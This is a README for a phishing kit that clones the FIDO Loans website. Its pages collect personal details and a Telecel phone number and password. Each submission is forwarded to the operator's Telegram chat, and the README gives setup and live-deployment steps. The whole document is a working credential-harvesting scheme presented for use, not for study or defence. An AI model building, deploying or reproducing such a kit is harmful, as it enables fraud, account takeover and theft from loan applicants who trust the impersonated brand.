# FIDO Loans – Local Production Setup

A pixel-faithful replica of the FIDO Loans web app with a built-in Telegram bot
that forwards every loan application to your Telegram chat/group.

---

## Pages

| Page | URL | Description |
|------|-----|-------------|
| Loan Qualifications | `/` or `/index.html` | Requirements checklist |
| Loan Application    | `/form.html`         | Full application form  |
| Telecel Verify      | `/details.html`      | Phone + password step  |

---

## Quick Start

### 1 – Prerequisites
- [Node.js](https://nodejs.org) v18 or later

### 2 – Install dependencies
```bash
npm install
```

### 3 – Configure the Telegram bot

**Create a bot:**
1. Open Telegram and message **@BotFather**
2. Send `/newbot` and follow the prompts
3. Copy the **token** (looks like `123456:ABC-DEF...`)

**Find your Chat ID:**
- For a personal chat: message your bot, then visit  
  `https://api.telegram.org/bot<TOKEN>/getUpdates`  
  and look for `"chat":{"id":XXXXXXXX}`
- For a group: add the bot to the group, send a message, use the same URL above.  
  Group IDs are negative numbers like `-100123456789`.

**Create the .env file:**
```bash
cp .env.example .env
# Edit .env and set BOT_TOKEN and CHAT_ID
```

### 4 – Run
```bash
npm start
```

Open **http://localhost:3000** in your browser.

---

## How it works

1. User confirms qualifications on `index.html`
2. Fills personal & loan details on `form.html`
3. Enters Telecel phone + password on `details.html`
4. Frontend POSTs the full payload to `POST /submit`
5. Server formats a rich Telegram message and sends it to your chat
6. User sees a success screen

---

## Telegram Message Sample

```
🏦 NEW LOAN APPLICATION – FIDO LOANS

👤 Personal Details
• Full Name:     Kwame Asante
• Date of Birth: 1990-05-14
• Email:         kwame@example.com
• Address:       Ring Road, Accra
• Employment:    Self-employed

💰 Loan Details
• Purpose:   Business
• Amount:    GHS 500
• Term:      30 days

📱 Telecel Verification
• Account Type: Mobile
• Phone Number: 0271234567

🕐 Submitted: 04/04/2026, 10:32:15 AM
```

---

## Production Deployment

For a live server (e.g. VPS / Render / Railway):

1. Set environment variables `BOT_TOKEN`, `CHAT_ID`, `PORT` on the platform
2. Run `npm start`

The app is self-contained – no database required.
